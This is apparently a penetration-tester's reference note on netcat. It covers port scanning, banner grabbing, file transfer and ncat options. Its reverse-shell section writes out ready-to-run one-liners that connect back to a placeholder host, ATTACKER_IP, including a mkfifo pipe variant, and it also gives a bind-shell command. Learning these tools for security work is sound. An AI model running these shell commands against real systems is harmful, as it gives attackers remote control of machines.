---
title: Netcat
tags:
  - tool
  - network
  - reverse-shell
  - file-transfer
  - pivoting
  - foundational
category: network
platform: cross-platform
install: apt install netcat-traditional / pre-installed on most Linux
created: 2026-03-23
updated: 2026-04-04
difficulty: foundational
---

# 🛠️ Netcat

## What It Is
Netcat ("the Swiss army knife of networking") is a utility that reads and writes data across network connections using TCP or UDP. It is used for port scanning, banner grabbing, file transfer, reverse/bind shells, and network debugging. It is available on virtually every Unix-like system and Windows.

## Installation
```bash
# Debian/Ubuntu
sudo apt install netcat-traditional   # Classic version with -e flag
sudo apt install ncat                 # Nmap's version (more features)

# Check which version
nc --version
nc -h
```

> **Note:** Two common variants exist:
> - `netcat-traditional` / `nc.traditional` — supports `-e` flag (execute)
> - `netcat-openbsd` — does NOT support `-e`; use the mkfifo pipe trick instead
> - `ncat` (from Nmap) — most feature-rich; supports SSL, proxies

---

## Basic Syntax
```bash
nc [options] [host] [port]      # Connect mode
nc -l [options] [port]          # Listen mode
```

---

## Common Commands / Use Cases

### Listen on a port (catch connections)
```bash
nc -lvnp 4444
# -l  listen
# -v  verbose
# -n  no DNS resolution
# -p  port number
```

### Connect to a host/port
```bash
nc 10.10.10.10 4444
```

### Banner grabbing / service identification
```bash
nc -nv 10.10.10.10 22       # SSH banner
nc -nv 10.10.10.10 80       # HTTP banner (then type: HEAD / HTTP/1.0 and press Enter twice)
nc -nv 10.10.10.10 25       # SMTP banner
```

### Simple port scan (no Nmap available)
```bash
# TCP scan on a range
nc -zv 10.10.10.10 1-1000 2>&1 | grep succeeded

# Single port check
nc -zv 10.10.10.10 443
# -z  zero I/O mode (scan only, don't send data)
```

### File transfer
```bash
# Receiver (listen first)
nc -lvnp 4444 > received_file.txt

# Sender (connect and push file)
nc 10.10.10.10 4444 < file_to_send.txt

# Transfer a directory (pipe with tar)
# Receiver:
nc -lvnp 4444 | tar xvf -
# Sender:
tar cvf - /path/to/dir | nc 10.10.10.10 4444
```

### Reverse shell (target calls back to attacker)
```bash
# Attacker — listener
nc -lvnp 4444

# Target — with -e flag (netcat-traditional)
nc ATTACKER_IP 4444 -e /bin/bash

# Target — without -e flag (openbsd variant)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
```

### Bind shell (target listens, attacker connects)
```bash
# Target — listener with shell
nc -lvnp 4444 -e /bin/bash

# Attacker — connect to target
nc 10.10.10.10 4444
```

### Chat / relay between two machines
```bash
# Machine A listens
nc -lvnp 4444

# Machine B connects
nc 10.10.10.10 4444
# Now both sides can type messages
```

### HTTP request (manual)
```bash
nc -nv 10.10.10.10 80
# Type:
GET / HTTP/1.0
Host: 10.10.10.10
[press Enter twice]
```

---

## Ncat (Nmap version) — Extra Features

```bash
# Listen with SSL
ncat --ssl -lvnp 4444

# Connect through SOCKS5 proxy
ncat --proxy 127.0.0.1:9050 --proxy-type socks5 10.10.10.10 4444

# Allow only specific IP to connect (access control)
ncat -lvnp 4444 --allow 10.10.14.1

# Persistent listener (re-listen after connection closes)
ncat -lvnp 4444 --keep-open
```

---

## Important Flags / Options

| Flag | Description |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS lookup (use IPs only) |
| `-p` | Port number (listen mode) |
| `-e` | Execute program after connect (not in openbsd variant) |
| `-z` | Zero I/O mode — scan only |
| `-u` | Use UDP instead of TCP |
| `-w` | Timeout in seconds |
| `-k` | Keep listening after connection (ncat) |
| `--ssl` | Use SSL encryption (ncat) |

---

## Opsec / Legal Notes
> ⚠️ Netcat connections are unencrypted. Traffic is visible on the wire. Use `ncat --ssl` or tunnel through SSH for encrypted communication.
- `-e /bin/bash` bind shells have no authentication — anyone who can reach the port gets a shell
- Some systems have Netcat removed for security reasons; use alternative file transfer methods

## Related Tools
- Reverse-Shells — full reverse shell reference
- [[Nmap]] — full-featured port scanner
- [[Wireshark]] — capture Netcat traffic for analysis

## Related Notes
- Networking-Basics
- TCP-IP-Fundamentals

## References
- Man page: `man nc`
- Ncat guide: https://nmap.org/ncat/guide/


## See Also

- Penetration-Testing-Methodology
- Linux-Commands
- Windows-Commands
- File-Transfer-Techniques
- Metasploit
- Bash-Scripting

---
<- [[Tools-MOC]]